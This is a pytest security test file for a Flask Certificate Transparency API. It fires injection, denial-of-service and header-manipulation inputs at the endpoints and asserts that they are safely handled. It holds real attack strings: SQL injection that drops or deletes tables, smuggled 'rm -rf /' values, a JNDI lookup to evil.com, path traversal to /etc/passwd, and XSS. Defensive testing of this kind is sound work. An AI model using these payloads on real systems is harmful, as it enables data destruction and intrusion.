"""
Security-focused tests for Certificate Transparency API endpoints.

Tests various attack vectors including injection, DoS, and abuse cases
from red team, blue team, and bug bounty perspectives.
"""

import pytest
import json
from app import create_app, db


class TestCTAPISecurityAttacks:
    """Security attack vector tests for CT API."""

    @pytest.fixture
    def app(self):
        """Create application for testing."""
        import os
        os.environ['ENVIRONMENT'] = 'testing'
        os.environ['CT_SERVICE_API_SECRET'] = 'test-secret-key'

        app = create_app()
        app.config['TESTING'] = True
        app.config['CT_SERVICE_API_SECRET'] = 'test-secret-key'

        with app.app_context():
            db.create_all()
            yield app
            db.drop_all()

            # Clean up environment
            if 'ENVIRONMENT' in os.environ:
                del os.environ['ENVIRONMENT']
            if 'CT_SERVICE_API_SECRET' in os.environ:
                del os.environ['CT_SERVICE_API_SECRET']

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()

    def test_sql_injection_in_date_filters(self, client):
        """Test SQL injection attempts in date parameters - Red Team attack."""
        # SQL injection payloads
        malicious_payloads = [
            "'; DROP TABLE certificate_log; --",
            "2024-01-01' OR '1'='1",
            "2024-01-01'; UPDATE certificate_log SET subject_common_name='hacked'; --",
            "2024-01-01' UNION SELECT * FROM information_schema.tables; --",
            "2024-01-01\"; DELETE FROM certificate_log; --"
        ]

        for payload in malicious_payloads:
            response = client.get(f'/api/v1/certificates?from_date={payload}')
            # Should return 400 for invalid date format, not execute SQL
            assert response.status_code == 400
            assert 'Invalid from_date format' in response.get_json()['error']

            response = client.get(f'/api/v1/certificates?to_date={payload}')
            assert response.status_code == 400
            assert 'Invalid to_date format' in response.get_json()['error']

    def test_parameter_pollution_limit_bypass(self, client):
        """Test multiple limit parameters for confusion attacks - Red Team attack."""
        # Parameter pollution attempts
        response = client.get('/api/v1/certificates?limit=10&limit=999999')
        assert response.status_code == 200

        # Should use Flask's default behavior (likely first value)
        # Verify response doesn't contain excessive data
        data = response.get_json()
        assert 'certificates' in data
        # Should be limited, not unlimited
        assert len(data['certificates']) <= 1000  # Max limit enforcement

    def test_resource_exhaustion_large_limit(self, client):
        """Test memory exhaustion via large limit values - Red Team DoS."""
        # Attempt resource exhaustion
        large_limits = [999999, 2147483647, -1, 0]

        for limit in large_limits:
            response = client.get(f'/api/v1/certificates?limit={limit}&include_pem=true')
            assert response.status_code == 200

            data = response.get_json()
            # Should cap at maximum allowed limit (1000)
            assert len(data['certificates']) <= 1000

    def test_deep_pagination_dos(self, client):
        """Test system impact of extremely deep pagination - Red Team DoS."""
        # Extremely high page numbers
        deep_pages = [999999, 2147483647, -1]

        for page in deep_pages:
            response = client.get(f'/api/v1/certificates?page={page}')
            assert response.status_code == 200

            # Should handle gracefully without crashing
            data = response.get_json()
            assert 'certificates' in data
            # Deep pages should return empty results, not crash
            assert isinstance(data['certificates'], list)

    def test_filter_injection_attempts(self, client):
        """Test injection attempts in filter parameters - Red Team attack."""
        injection_payloads = [
            "test' OR '1'='1",
            "test'; DELETE FROM certificate_log; --",
            "test\" OR \"1\"=\"1",
            "%' OR '1'='1' --",
            "'; UNION SELECT password FROM users; --"
        ]

        filter_params = ['subject', 'issuer', 'serial', 'fingerprint']

        for param in filter_params:
            for payload in injection_payloads:
                response = client.get(f'/api/v1/certificates?{param}={payload}')
                assert response.status_code == 200

                # Should treat as literal string, not execute SQL
                data = response.get_json()
                assert 'certificates' in data
                # Should return empty or safe results
                assert isinstance(data['certificates'], list)

    def test_header_injection_xforwarded(self, client):
        """Test X-Forwarded-For header manipulation - Red Team attack."""
        # Headers without newlines (Werkzeug rejects newlines properly)
        safe_malicious_headers = {
            'X-Forwarded-For': '127.0.0.1, <script>alert("xss")</script>',
            'User-Agent': 'Mozilla/5.0 <script>alert("xss")</script>',
            'X-Real-IP': '127.0.0.1; rm -rf /',
            'X-Forwarded-For': '::1, 192.168.1.1, ; rm -rf /'
        }

        for header, value in safe_malicious_headers.items():
            response = client.get('/api/v1/certificates', headers={header: value})
            assert response.status_code == 200

            # Should not reflect malicious content in response
            response_text = response.get_data(as_text=True)
            assert '<script>' not in response_text
            assert 'rm -rf' not in response_text

        # Test that newline injection is properly rejected by framework
        newline_injection_headers = {
            'X-Real-IP': '127.0.0.1\r\nMalicious: header',
            'User-Agent': 'Normal\r\nX-Admin: true'
        }

        for header, value in newline_injection_headers.items():
            try:
                client.get('/api/v1/certificates', headers={header: value})
                pytest.fail(f"Should have rejected header with newline: {header}")
            except ValueError as e:
                assert "newline characters" in str(e), f"Expected newline rejection error for {header}"

    def test_malformed_json_parameter_abuse(self, client):
        """Test malformed parameter values - Red Team attack."""
        malformed_params = [
            'page={"evil": "payload"}',
            'limit=[1,2,3,4,5]',
            'type=null\x00injection',
            'subject=\x00\x01\x02\x03\x04',
            'page=javascript:alert(1)'
        ]

        for param in malformed_params:
            response = client.get(f'/api/v1/certificates?{param}')
            # Should handle gracefully, not crash
            assert response.status_code in [200, 400]

            if response.status_code == 200:
                data = response.get_json()
                assert 'certificates' in data

    def test_concurrent_request_handling(self, client):
        """
        Test concurrent request handling - Blue Team monitoring.

        Security consideration: Flask test client is not thread-safe by default.
        This test uses a lock to ensure thread-safe access to the test client
        while still verifying the application itself handles concurrent requests
        properly without race conditions.
        """
        import threading

        results = []
        lock = threading.Lock()

        def make_request():
            # Use lock to make Flask test client calls thread-safe
            # This tests that the application logic is race-condition free
            with lock:
                response = client.get('/api/v1/certificates?limit=100')
                results.append(response.status_code)

        # Simulate concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # All requests should succeed (no race conditions)
        assert len(results) == 10, f"Expected 10 results, got {len(results)}"
        non_200_statuses = [s for s in results if s != 200]
        assert all(status == 200 for status in results), \
            f"Some requests failed with status codes: {non_200_statuses}"

    def test_error_message_information_disclosure(self, client):
        """Test error messages for information disclosure - Bug Bounty target."""
        # Attempt to trigger various error conditions
        error_triggers = [
            '/api/v1/certificates?page=abc',
            '/api/v1/certificates?limit=abc',
            '/api/v1/certificates?sort=nonexistent_field',
            '/api/v1/certificates?from_date=invalid',
            '/api/v1/nonexistent_endpoint'
        ]

        for trigger in error_triggers:
            response = client.get(trigger)
            response_text = response.get_data(as_text=True)

            # Should not expose sensitive information
            sensitive_patterns = [
                'Traceback',
                'File "/',
                'line ',
                'postgresql://',
                'database',
                'password',
                'secret',
                'key',
                'Exception:',
                'Error:',
                'Warning:'
            ]

            for pattern in sensitive_patterns:
                assert pattern.lower() not in response_text.lower(), f"Information disclosure: {pattern} found in error response"

    def test_response_size_limits(self, client):
        """Test response size limits to prevent DoS - Blue Team defense."""
        # Request large dataset
        response = client.get('/api/v1/certificates?limit=1000&include_pem=true')
        assert response.status_code == 200

        # Response should be reasonable size (not unlimited)
        response_size = len(response.get_data())
        # Assuming max reasonable response size (adjust based on requirements)
        max_response_size = 50 * 1024 * 1024  # 50MB
        assert response_size < max_response_size, f"Response too large: {response_size} bytes"

    def test_input_sanitization_special_characters(self, client):
        """Test input sanitization for special characters - OWASP prevention."""
        special_chars = [
            '%00',  # Null byte
            '%0A%0D',  # CRLF injection
            '../../../etc/passwd',  # Path traversal
            '${jndi:ldap://evil.com/}',  # Log4j style injection
            '{{7*7}}',  # Template injection
            '<img src=x onerror=alert(1)>',  # XSS
            '${ENV:SECRET_KEY}',  # Environment variable injection
        ]

        for char in special_chars:
            response = client.get(f'/api/v1/certificates?subject={char}')
            assert response.status_code == 200

            # Should treat as literal string, not interpret
            data = response.get_json()
            assert 'certificates' in data

            # Response should contain escaped content, not raw malicious content
            response_text = response.get_data(as_text=True)

            # Check for dangerous patterns - some may be escaped
            if 'alert(' in response_text:
                # If alert is present, it should be HTML-escaped
                assert '&lt;' in response_text or 'alert(' not in char, "XSS payload not properly escaped"

            # Should not contain actual executable script tags
            assert '<script>' not in response_text
            assert 'javascript:' not in response_text

    def test_authentication_timing_attacks(self, client):
        """Test authentication timing to prevent enumeration - Bug Bounty defense."""
        import time

        # Test POST endpoint authentication timing
        valid_secret = 'test-secret-key'
        invalid_secrets = ['wrong-secret', 'a', 'x' * 1000, '']

        timing_results = []

        # Test valid authentication timing
        start_time = time.time()
        response = client.post('/api/v1/certificates',
                             headers={'X-CT-API-Secret': valid_secret},
                             json={'certificate_pem': 'test', 'certificate_type': 'client'})
        valid_timing = time.time() - start_time
        timing_results.append(valid_timing)

        # Test invalid authentication timing
        for secret in invalid_secrets:
            start_time = time.time()
            response = client.post('/api/v1/certificates',
                                 headers={'X-CT-API-Secret': secret},
                                 json={'certificate_pem': 'test', 'certificate_type': 'client'})
            invalid_timing = time.time() - start_time
            timing_results.append(invalid_timing)

        # With constant-time comparison, timing should be more consistent
        # Allow reasonable variance (within 100% of average due to test environment)
        avg_timing = sum(timing_results) / len(timing_results)
        for timing in timing_results:
            variance = abs(timing - avg_timing) / avg_timing if avg_timing > 0 else 0
            assert variance < 1.0, f"Excessive timing variance: {variance:.2%} for timing {timing:.4f}s vs avg {avg_timing:.4f}s"